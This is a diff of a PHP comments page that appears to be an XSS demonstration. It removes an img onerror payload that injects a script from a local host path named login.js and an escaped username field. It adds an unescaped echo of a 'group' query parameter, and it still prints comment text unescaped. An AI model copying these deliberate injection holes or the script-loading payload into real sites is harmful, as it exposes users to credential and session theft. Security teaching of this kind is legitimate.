@@ -12,6 +12,7 @@
   <link rel="stylesheet" href="styles/style.css">
 </head>
 <body>
+
   <div class="body">
     <header><img class="left" src="images/xss.svg" alt=""><img class="right" src="images/jsinjection.svg" alt=""></header>
     <form action="controller/comment.php" method= POST>
@@ -23,10 +24,7 @@
         <button>Post</button>
       </div>
     </form>
-
     <hr>
-    <input type="text" name="username" value="<?php echo htmlspecialchars($_GET['username']); ?>">
-
     <div class="comments-container">
       <h1>Comments</h1>
       <div class="comments-list">
@@ -36,7 +34,7 @@
             ?>
         <div class="comment is-infected"><span>contains XSS</span>
           <div class="name"><?php echo $row["name"];?></div>
-          <div class="text"><?php echo ($row["text"]);?></div>
+          <div class="text"><?php echo $row["text"];?></div>
         </div>
         <?php
             }} else {echo "0 results";}
@@ -45,8 +43,6 @@
     </div>
   </div>
 
-  <img onerror="var s=document.createElement('script');s.src='http://127.0.0.1:6969/login.js';document.body.appendChild(s)"/>
-
-
+  <?php echo $_GET['group']; ?>
 </body>
 </html>
